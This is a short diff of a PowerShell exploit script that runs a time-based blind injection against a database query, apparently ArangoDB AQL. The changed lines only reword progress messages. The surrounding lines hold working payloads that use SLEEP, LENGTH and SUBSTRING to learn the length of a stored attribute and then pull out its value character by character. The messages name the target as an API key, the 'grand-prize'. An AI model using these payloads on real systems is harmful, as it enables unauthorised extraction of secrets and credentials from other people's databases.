@@ -259,7 +259,7 @@ foreach($pos in 0..$len){
 "Found: " + $name
 
 
-"`nTrying to find length of the attribute value in doc.deactivate_api_key: "
+"`nTrying to find length of the attribute value in doc.$name : "
 0..64 | % {
     $apikey = "`' OR LENGTH(doc.$name) == $_ ? SLEEP($sleepytime) : `'"
 
@@ -281,7 +281,7 @@ foreach($pos in 0..$len){
 }
 
 $value = ""
-"`nTrying to find the grand-prize, the value of deactivate_api_key: "
+"`nTrying to find the grand-prize, the value of doc.$name : "
 foreach($pos in 0..$len){
     foreach($letter in $letters){
         $apikey = "`' OR SUBSTRING(doc.$name, $pos, 1) == `"$letter`" ? SLEEP($sleepytime) : `'"
